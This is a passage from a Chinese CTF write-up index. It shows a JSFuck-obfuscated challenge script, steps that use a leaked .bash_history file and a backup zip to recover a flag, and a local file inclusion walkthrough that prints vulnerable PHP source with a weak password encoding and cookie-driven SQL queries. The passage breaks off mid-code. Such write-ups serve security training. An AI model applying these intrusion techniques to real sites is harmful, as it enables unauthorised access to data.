+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+[]))+(+!![]+[])+({}+[])[!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(![]+[])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(![]+[])[+!![]]+(![]+[])[+!![]]+(![]+[])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+[])+(![]+[])[+[]]+({}[[]]+[])[!![]+!![]]+(!![]+!![]+!![]+[])+({}+[])[!![]+!![]]+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+[])[!![]+!![]+!![]])+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[+[]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+[]))+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))()", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_3", 
            "text": "javascript代码格式为 jsfuck编码  运行代码得到 1bc29b36f623ba82aaf6724fd3b16718.php ，这时候会想到解码这个字符串，可能为16进制转换，也可能为md5加密，但这题在这里只是个陷阱  \"在我脑袋里\"的提示解密有点无厘头，这里的貌似只能靠联想  history of bash 需要想到.bash_history文件名", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_4", 
            "text": "在chrome console中运行上述代码，得到结果：   1bc29b36f623ba82aaf6724fd3b16718.php   访问上述网址，得到结果：    哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里    根据\"在我脑袋里\"的提示，查看response中的header标签，看到一项非正常的返回头   tip: history of bash   根据提示，访问.bash_history：   http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history  得到结果：  shell\n   zip -r flagbak.zip ./*   根据提示，访问：   http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip  下载解压flagbak.zip后得到flag", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_5", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_6", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe2/", 
            "text": "综合2\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#%E7%BB%BC%E5%90%88%E9%A2%982\n\n\n```\nXlcteam客户留言板\n\n\n欢迎来到Xlcteam客户留言板，各位朋友可以在这里留下对本公司的意见或建议。\n\n\n本组织主要为企业提供网络安全服务。正如公司名所说，本公司是混迹在“娱乐圈”中的公司，喜欢装B，一直摸黑竞争对手，从未被黑。\n  本公司的经营理念为“技术好，算个吊，摸黑对手有一套，坑到学生才叫吊~”。\n  你别说不爽我们，有本事来爆我们（科哥）菊花~ come on！！\n\n\n客户留言：\n\n\n大秘密:\n    交个朋友吧，这个是我微信号 e045e454c18ca8a4415cfeddd1f7375eb0595c71ac00a0e4758761e1cc83f2c565bb09bfd94d1f6c2ffc0fb9849203a14af723b532cbf44a2d6f41b0dee4e834 这是原来管理员说的话，一不小心给覆盖了，sorry！！！欢迎来到xlcteam渗透挑战平台，在这里各位黑阔可以尽情施展你们那牛X的技术和猥琐流的渗透技巧。 （别说SAE没有写权限传不了shell，渗透到后台之后就什么都知道了）。 对了，各位脚本小子就不要拿各种扫描工具猛扫了，也扫不到什么东西的。当然，适当的收集资料还是可以的\nt0n9:\n    t0n9\nggggg:\n    hi\nBeta.meee:\n    Hacked by meee\nsido:\n    123\nHolden:\n    山东红蓝队\n小圆圆，小圆圆！:\n    hacked by 小圆圆\n```\n\n\n\n\n解答思路\n\n\n\n\n遍历所有页面，查看所有隐藏信息\n\n\n使用LFI查看所有页面的源代码\n\n\n\n\n解题步骤\n\n\n0x1 查看页面底部的链接\n\n\n\n\n本CMS说明\n\n\n\n\n内容如下：\n\n\n\n\n很明显，这是安装后留下来忘删除的文件。。。 至于链接会出现在主页上，这就要问管理员了。。。 ===============================华丽的分割线============================= 本CMS由Funny公司开发的公司留言板系统，据本技术总监说，此CMS采用国际 顶级的技术所开发，安全性和实用性杠杠滴~\n 以下是本CMS各文件的功能说明（由于程序猿偷懒，只列了部分文件） config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索，我在这里给出admin表结构 create table admin ( id integer, username text, userpass text, ) ======================================================================== 下面是正经的： 本渗透测试平台由：三只小潴(root#zcnhonker.net)\n 冷爱(hh250@qq.com)开 发.由你们周老大我辛苦修改，不能题目都被AK嘛，你们说是不是。所以这一题。。你们做出来也算你们吊咯。 \n\n\n\n\n可以得知：\n\n\n\n\n\n\n页面包含的文件如下：\n\n\n\n\n\n\nconfig.php\n\n\n\n\npassencode.php \n\n\nindex.php\n\n\nsay.php\n\n\n\n\nsm.txt\n\n\n\n\n\n\nadmin的表结构如下：\n\n\n\n\n\n\nmssql\n   create table admin ( id integer, username text, userpass text, )\n\n\n0x2 依次访问各文件\n\n\n通过文件包含的方式（类似http://cms.nuptzj.cn/about.php?file=sm.txt），依次访问各个文件\n\n\n\n\nconfig.php \n\n\n\n\n无任何返回值\n\n\n\n\npassencode.php \n\n\n\n\nphp+HTML\n  \n?php function passencode($content){\n      $pass=urlencode($content);\n      $array=str_split($content);\n      $pass=\"\"; \n      for($i=0;$i\ncount($array);$i++){\n          if($pass!=\"\"){\n              $pass=$pass.\" \".(string)ord($array[$i]);}\n          else{ \n              $pass=(string)ord($array[$i]);\n          } \n      } return $pass;\n  }\n  ?\n\n\n这里可以看出密码在数据库的存储方式：将每个字符转化为其ascii码值，以空格为分隔符进行拼接\n\n\n\n\nsay.php \n\n\n\n\n```php+html\n  \n\n      \n\n          \n\n          \n?php\n          include 'config.php';\n          $nice=$_POST['nice'];\n          $say=$_POST['usersay'];\n          if(!isset($_COOKIE['username'])){\n          setcookie('username',$nice);\n          setcookie('userpass','');\n          }\n          $username=$_COOKIE['username'];\n          $userpass=$_COOKIE['userpass'];\n          if($nice==\"\"|| $say==\"\"){\n          echo \"\nalert('昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)');\n\";\n          exit();\n          }\n          $con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error());\n          mysql_select_db($db_name,$con);\n          $nice=mysql_real_escape_string($nice);\n\n\n      $username=mysql_real_escape_string($username);\n      $userpass=mysql_real_escape_string($userpass);\n      $result=mysql_query(\"SELECT username FROM admin where username='$nice'\",$con);\n      $login=mysql_query(\"SELECT * FROM admin where username='$username' AND 